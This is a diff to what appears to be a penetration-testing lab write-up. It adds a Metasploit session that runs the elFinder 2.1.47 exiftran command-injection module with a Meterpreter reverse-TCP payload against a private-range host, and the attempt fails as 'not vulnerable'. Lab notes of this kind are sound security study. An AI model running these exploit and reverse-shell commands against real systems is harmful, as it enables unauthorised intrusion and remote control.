@@ -340,5 +340,30 @@ SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?
 > [!note]
 > Tried to use the exploit found on exploit DB https://www.exploit-db.com/exploits/46481 - no luck and rather try metasploit for now.
 
+```
+msf > search 2.1.47
 
+Matching Modules
+================
+
+   #  Name                                                               Disclosure Date  Rank       Check  Description
+   -  ----                                                               ---------------  ----       -----  -----------
+   0  exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection  2019-02-26       excellent  Yes    elFinder PHP Connector exiftran Command Injection
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
+
+msf > set RHOSTS 10.66.172.224
+RHOSTS => 10.66.172.224
+msf > exploit
+[-] Unknown command: exploit. Run the help command for more details.
+msf > use 0
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+msf exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > exploit
+[*] Started reverse TCP handler on 192.168.50.144:4444 
+[-] Exploit aborted due to failure: not-vulnerable: Target is not vulnerable
+[*] Exploit completed, but no session was created.
+msf exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > 
+
+```
 
